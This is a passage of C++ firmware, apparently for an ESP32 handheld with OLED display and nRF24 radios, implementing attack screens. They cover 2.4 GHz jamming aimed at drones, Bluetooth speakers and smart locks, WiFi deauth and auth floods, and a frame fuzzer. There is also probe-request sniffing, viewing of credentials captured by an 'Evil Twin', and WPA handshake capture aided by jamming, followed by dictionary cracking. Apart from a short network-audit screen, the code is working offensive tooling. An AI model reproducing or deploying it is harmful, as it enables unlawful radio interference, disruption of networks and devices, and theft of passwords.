    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
    ggFloodNrfActive = true;
    gDroneStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gDroneWifiUp) { ggWifiTxEnd(); gDroneWifiUp = false; }
    if (gDroneBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gDroneBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  static uint32_t lastDroneHop = 0;
  static uint8_t droneHopCh = 1;
  uint32_t now = millis();
  if (now - lastDroneHop >= 60) {
    lastDroneHop = now;
    droneHopCh++; if (droneHopCh > 14) droneHopCh = 1;
    gWifiTx.channel = droneHopCh;
    ggWifiTxSetChannel(droneHopCh, gWifiTx);
  }
  uint32_t elapsed = (millis()-gDroneStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("DRONE DROP");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("2.4G ALL RADIOS");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u+%u",wf,bf,ggFloodNrfPosA,ggFloodNrfPosB); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- PROBE HARVEST
// Passive promiscuous-mode sniffer. Captures probe request SSIDs from nearby
// devices, revealing what WiFi networks they're searching for.
static uint8_t  gProbeCh = 1;
static uint32_t gProbeChLast = 0;

static inline void ggScreenProbeRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggProbeBegin();
    gProbeCh = 1;
    ggProbeSetChannel(gProbeCh);
    gProbeChLast = millis();
    gRunInit = true;
  }
  if (gEv.back) { ggProbeEnd(); ggBack(); return; }
  uint32_t now = millis();
  if (now - gProbeChLast >= 400) {
    gProbeCh++; if (gProbeCh > 14) gProbeCh = 1;
    ggProbeSetChannel(gProbeCh);
    gProbeChLast = now;
  }
  int n = ggProbeN;
  int pt = ggProbeTotal;
  if (n > GG_PROBE_MAX) n = GG_PROBE_MAX;
  if (n > 0) ggMove(0, n - 1);
  ggOled.clearDisplay(); ggHeader("PROBE SNIFF");
  ggOled.setTextColor(SSD1306_WHITE);
  ggOled.setCursor(2, 18);
  ggOled.printf("CH%u N:%d P:%d", gProbeCh, n, pt);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    if (gSel < top) top = gSel;
    // snapshot visible rows to avoid cross-core tearing
    char snapS[3][22]; uint8_t snapC[3];
    int snapN = 0;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      memcpy(snapS[i], ggProbeSSIDs[idx], 22);
      snapC[i] = ggProbeCounts[idx];
      snapN++;
    }
    for (int i = 0; i < snapN; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y - 1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else {
        ggOled.setTextColor(SSD1306_WHITE);
      }
      ggOled.setCursor(2, y);
      ggOled.printf("%.15s x%u", snapS[i], snapC[i]);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Listening...");
  }
  ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  ggOled.setCursor(2, 56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- SAVED CREDS
static inline void ggScreenCredView() {
  if (!gRunInit) {
    ggCredCount = ggLoadCreds(ggCredStore, GG_CRED_MAX);
    gRunInit = true;
  }
  if (gEv.back) { ggBack(); return; }
  if (ggCredCount == 0) {
    ggOled.clearDisplay(); ggHeader("Saved Creds");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2, 28); ggOled.print("No creds saved");
    ggOled.setCursor(2, 38); ggOled.print("Use Evil Twin first");
    ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
    ggOled.setCursor(2, 56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggCredCount);
  if (gEv.sel && gSel == ggCredCount) {
    ggClearCreds(); ggCredCount = 0;
    ggClickFire(); return;
  }
  static char rows[GG_CRED_MAX + 1][22]; const char* p[GG_CRED_MAX + 1];
  for (int i = 0; i < ggCredCount; i++) {
    snprintf(rows[i], 22, "%.9s:%.9s", ggCredStore[i].user, ggCredStore[i].pass);
    p[i] = rows[i];
  }
  snprintf(rows[ggCredCount], 22, "[CLEAR ALL]");
  p[ggCredCount] = rows[ggCredCount];
  static char hBuf[22];
  if (gSel < ggCredCount)
    snprintf(hBuf, 22, "%.21s", ggCredStore[gSel].pass);
  else
    snprintf(hBuf, 22, "Delete all saved");
  ggMenu("Saved Creds", p, ggCredCount + 1, gSel, gTop, hBuf);
}

// ---------------------------------------------------------------- WIFI CRACK pick
static inline void ggScreenCrackPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("WiFi Crack");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("WiFi Crack");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    GgWifiAP& ap = ggWifiAPs[gSel];
    if (ap.enc < 2 || ap.enc == 5) {
      ggClickBack(); return;
    }
    ggWifiPickScanEnd();
    memcpy(ggHsTargetBssid, ap.bssid, 6);
    ggHsTargetCh = ap.channel;
    strncpy(ggHsTargetSsid, ap.ssid, 32); ggHsTargetSsid[32]='\0';
    ggClickFire();
    ggGo(GS_CRACK_CAP);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  static const char* const ENC_TAG[] = {"OPN","WEP","WPA","WP2","W12","ENT","WP3","W23","WAP"};
  for (int i=0;i<ggWifiAPCount;i++){
    const char* et = (ggWifiAPs[i].enc < 9) ? ENC_TAG[ggWifiAPs[i].enc] : "???";
    snprintf(rows[i],22,"%.7s %s %ddB",ggWifiAPs[i].ssid,et,ggWifiAPs[i].rssi);
    p[i]=rows[i];
  }
  const char* hint = "SEL=crack target";
  GgWifiAP& sel = ggWifiAPs[gSel];
  if (sel.enc < 2 || sel.enc == 5) hint = "Can't crack this type";
  ggMenu("WiFi Crack", p, ggWifiAPCount, gSel, gTop, hint);
}

// ---------------------------------------------------------------- WIFI CRACK capture
static uint32_t gCrackCapStart = 0;
static uint8_t  gCrackCapPhase = 0;
static uint32_t gCrackPhaseMs  = 0;
static bool     gCrackJamUp    = false;
static bool     gCrackTimedOut = false;
#define GG_CRACK_TIMEOUT_S 120
static inline void ggScreenCrackCap() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggCrackCaptureBegin(ggHsTargetCh);
    gCrackCapStart = millis();
    gCrackCapPhase = 0;
    gCrackPhaseMs = millis();
    gCrackJamUp = false;
    gCrackTimedOut = false;
    gRunInit = true;
  }
  if (gEv.back) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    ggBack(); return;
  }
  uint32_t capElapsed = (millis() - gCrackCapStart) / 1000;
  if (capElapsed >= GG_CRACK_TIMEOUT_S && !ggHsCaptured) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    gCrackTimedOut = true;
    ggCrackDone = true;
    ggCrackFound = false;
    ggBack(); ggGo(GS_CRACK_DONE);
    return;
  }
  if (ggHsCaptured) {
    if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
    ggCrackCaptureEnd();
    ggClickFire();
    ggCrackBegin();
    ggBack(); ggGo(GS_CRACK_DONE);
    return;
  }
  uint32_t now = millis();
  uint32_t phaseElapsed = now - gCrackPhaseMs;
  switch (gCrackCapPhase) {
    case 0:
      if (phaseElapsed > 3000) { gCrackCapPhase=1; gCrackPhaseMs=now; }
      break;
    case 1:
      if (ggNrfPresentA || ggNrfPresentB) {
        ggFloodNrfStart(ggHsTargetCh);
        gCrackJamUp = true;
      }
      gCrackCapPhase=2; gCrackPhaseMs=now;
      break;
    case 2:
      ggFloodNrfPump();
      if (phaseElapsed > 3000) { gCrackCapPhase=3; gCrackPhaseMs=now; }
      break;
    case 3:
      if (gCrackJamUp) { ggFloodNrfStop(); gCrackJamUp=false; }
      gCrackCapPhase=4; gCrackPhaseMs=now;
      break;
    case 4:
      if (phaseElapsed > 5000) { gCrackCapPhase=1; gCrackPhaseMs=now; }
      break;
  }
  ggOled.clearDisplay(); ggHeader("HANDSHAKE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18);
  char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
  ggOled.setCursor(2,27);
  ggOled.printf("CH%u  Data:%lu", ggHsTargetCh, (unsigned long)ggHsDataPkts);
  ggOled.setCursor(2,36);
  ggOled.printf("EAPOL:%lu", (unsigned long)ggHsEapolPkts);
  if (ggHs.gotMsg1) ggOled.print(" Msg1!");
  uint32_t timeLeft = (capElapsed < GG_CRACK_TIMEOUT_S) ? GG_CRACK_TIMEOUT_S - capElapsed : 0;
  ggOled.setCursor(2,45);
  if (gCrackJamUp) ggOled.printf("JAMMING  %lus left",(unsigned long)timeLeft);
  else             ggOled.printf("Listen.. %lus left",(unsigned long)timeLeft);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=abort");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI CRACK result
static inline void ggScreenCrackDone() {
  if (!gRunInit) { gRunInit = true; }
  if (gEv.back) {
    ggCrackEnd();
    ggBack(); return;
  }
  ggOled.clearDisplay();
  if (!ggCrackDone) {
    ggHeader("CRACKING");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,28);
    ggOled.printf("Trying %lu/%d",(unsigned long)ggCrackTried,GG_CRACK_DICT_N);
    int bar = (int)((uint32_t)ggCrackTried * 100 / GG_CRACK_DICT_N);
    ggOled.setCursor(2,38);
    ggOled.printf("Progress: %d%%", bar);
    ggOled.drawRect(2,47,124,8,SSD1306_WHITE);
    int fill = (int)((uint32_t)ggCrackTried * 120 / GG_CRACK_DICT_N);
    if (fill > 0) ggOled.fillRect(4,49,fill,4,SSD1306_WHITE);
  } else if (ggCrackFound) {
    ggHeader("CRACKED!");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("Password found:");
    ggOled.setCursor(2,40);
    char pw[22]; snprintf(pw,22,"%.21s",ggCrackPass); ggOled.print(pw);
  } else if (gCrackTimedOut) {
    ggHeader("TIMEOUT");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("No handshake caught");
    ggOled.setCursor(2,40);
    ggOled.printf("Data:%lu EAPOL:%lu",(unsigned long)ggHsDataPkts,(unsigned long)ggHsEapolPkts);
  } else {
    ggHeader("NO MATCH");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("Not in dictionary");
    ggOled.setCursor(2,40);
    ggOled.printf("Tried %d passwords",GG_CRACK_DICT_N);
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=done");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI RICKROLL menu
static inline void ggScreenRickMenu() {
  static const char* const RICK_ITEMS[] = { "Edit message >", "BROADCAST >" };
  static const char* const RICK_HINTS[] = { "Type your message", "Send it to the air" };
  ggMove(0, 1);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    if (gSel == 0) {
      ggOpenBytes((uint8_t*)ggRickMsg, ggRickLen, "RICKROLL MSG", true, &ggRickLen, 32);
    } else {
      ggClickFire(); ggGo(GS_RICK_RUN);
    }
    return;
  }
  ggMenu("WiFi Rickroll", RICK_ITEMS, 2, gSel, gTop, RICK_HINTS[gSel]);
}

// ---------------------------------------------------------------- WIFI RICKROLL run
static uint32_t gRickStartMs = 0;
static inline void ggScreenRickRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiRickMode = true;
    ggRickCount = 0;
    gWifiTx.channel = 1; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gRickStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  { static uint32_t rLastHop=0; static uint8_t rHi=0; static const uint8_t rHC[]={1,6,11};
    if(millis()-rLastHop>=500){ rLastHop=millis(); rHi=(rHi+1)%3; gWifiTx.channel=rHC[rHi]; ggWifiTxSetChannel(rHC[rHi],gWifiTx); } }
  uint32_t cnt = ggRickCount;
  uint32_t elapsed = (millis()-gRickStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("RICKROLL");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u BROADCAST", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  char mp[22]; snprintf(mp,22,"\"%.19s\"",ggRickMsg);
  ggOled.print(mp);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- SPEAKER JAM
// Disrupts Bluetooth Classic speakers. nRF noise across the BT band (2402-2480MHz),
// BLE advertising flood, WiFi beacons on ch1/6/11 for wideband interference.
static uint32_t gSpeakerStartMs = 0;
static bool     gSpeakerWifiUp = false;
static bool     gSpeakerBleUp  = false;

static inline void ggScreenSpeakerRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gSpeakerWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gSpeakerBleUp = true;
    ggFloodNrfChLo = 2; ggFloodNrfChHi = 80;
    ggFloodNrfPosA = 2; ggFloodNrfPosB = 40;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 2);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 40);
    ggFloodNrfActive = true;
    gSpeakerStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gSpeakerWifiUp) { ggWifiTxEnd(); gSpeakerWifiUp = false; }
    if (gSpeakerBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gSpeakerBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  static uint32_t lastSpkHop = 0;
  static const uint8_t spkChans[] = {1, 6, 11};
  static uint8_t spkIdx = 0;
  uint32_t now = millis();
  if (now - lastSpkHop >= 80) {
    lastSpkHop = now;
    spkIdx = (spkIdx + 1) % 3;
    gWifiTx.channel = spkChans[spkIdx];
    ggWifiTxSetChannel(spkChans[spkIdx], gWifiTx);
  }
  uint32_t elapsed = (millis()-gSpeakerStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("SPEAKER JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("BT CLASSIC BAND");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u",wf,bf,ggFloodNrfPosA); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- SMART LOCK BUZZ
// BLE disruption targeting smart lock data channels. nRF noise on BLE band
// (nRF ch 2-80) + BLE advertising flood. No WiFi needed.
static uint32_t gSlockStartMs = 0;
static bool     gSlockBleUp = false;

static inline void ggScreenSlockRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gSlockBleUp = true;
    ggFloodNrfChLo = 2; ggFloodNrfChHi = 80;
    ggFloodNrfPosA = 2; ggFloodNrfPosB = 40;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 2);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 40);
    ggFloodNrfActive = true;
    gSlockStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gSlockBleUp) { ggBleFloodMode = false; ggBleTxEnd(); gSlockBleUp = false; }
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  uint32_t elapsed = (millis()-gSlockStartMs)/1000;
  uint32_t bPkt = ggBlePktEst();
  gPhase = bPkt/50;
  ggOled.clearDisplay(); ggHeader("SMART LOCK");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("BLE BAND FLOOD");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(bPkt));
  ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("nRF:%u+%u BLE+nRF",ggFloodNrfPosA,ggFloodNrfPosB);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- NETWORK AUDIT
// Scans WiFi and shows encryption type + security rating for each network.
static const char* ggEncName(uint8_t enc) {
  switch (enc) {
    case 0: return "OPEN";
    case 1: return "WEP";
    case 2: return "WPA";
    case 3: return "WPA2";
    case 4: return "WPA/2";
    case 5: return "ENT";
    case 6: return "WPA3";
    case 7: return "WPA2/3";
    case 8: return "WAPI";
    default: return "???";
  }
}
static const char* ggEncRating(uint8_t enc) {
  switch (enc) {
    case 0: return "NO PASSWORD!";
    case 1: return "WEAK-easy to crack";
    case 2: return "FAIR-outdated";
    case 3: return "GOOD-standard";
    case 4: return "GOOD-mixed mode";
    case 5: return "STRONG-enterprise";
    case 6: return "BEST-modern WPA3";
    default: return "UNKNOWN";
  }
}
static uint8_t gNetDetailIdx = 0;

static inline void ggScreenNetAudit() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Network Audit");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Network Audit");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gNetDetailIdx = gSel;
    ggWifiPickScanEnd();
    ggGo(GS_NET_DETAIL);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){
    snprintf(rows[i],22,"%.8s %s %ddB",ggWifiAPs[i].ssid,ggEncName(ggWifiAPs[i].enc),ggWifiAPs[i].rssi);
    p[i]=rows[i];
  }
  static char hBuf[22];
  snprintf(hBuf,22,"%s",ggEncRating(ggWifiAPs[gSel].enc));
  ggMenu("Network Audit", p, ggWifiAPCount, gSel, gTop, hBuf);
}

static inline void ggScreenNetDetail() {
  if (gEv.back) { ggBack(); return; }
  if (gNetDetailIdx >= ggWifiAPCount) { ggBack(); return; }
  const GgWifiAP& ap = ggWifiAPs[gNetDetailIdx];
  ggOled.clearDisplay(); ggHeader(ap.ssid);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("CH:%u  RSSI:%ddB", ap.channel, ap.rssi);
  ggOled.setCursor(2,25); ggOled.printf("Enc: %s", ggEncName(ap.enc));
  ggOled.setCursor(2,34); ggOled.print(ggEncRating(ap.enc));
  ggOled.setCursor(2,43); ggOled.printf("%02X:%02X:%02X:%02X:%02X:%02X",
    ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=go back");
  ggOled.display();
}

// ================================================================
//  BATCH 2 SCREENS
// ================================================================

// ---------------------------------------------------------------- AUTH FLOOD (pick + run)
static uint32_t gAuthStartMs = 0;
static bool     gAuthNrfUp = false;

static inline void ggScreenAuthPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Auth target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Auth target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_AUTH_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Auth target", p, ggWifiAPCount, gSel, gTop, "SEL=flood auth frames");
}

static inline void ggScreenAuthRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiAuthFlood = true;
    ggAuthFloodCnt = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    ggFloodNrfStart(gWifiTx.channel);
    gAuthNrfUp = true;
    gAuthStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    if (gAuthNrfUp) { ggFloodNrfStop(); gAuthNrfUp = false; }
    ggWifiTxEnd(); ggBack(); return;
  }
  ggFloodNrfPump();
  uint32_t cnt = ggAuthFloodCnt;
  uint32_t elapsed = (millis()-gAuthStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  ggOled.clearDisplay(); ggHeader("AUTH FLOOD");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u MAX PWR", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu auth/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI FUZZER
static uint32_t gFuzzStartMs = 0;
static inline void ggScreenFuzzRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiFuzzMode = true;
    ggFuzzCount = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gFuzzStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  uint32_t cnt = ggFuzzCount;
  uint32_t elapsed = (millis()-gFuzzStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("WIFI FUZZ");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u RANDOM FRM", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu fuzz/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- QUIET STORM (pick + run)
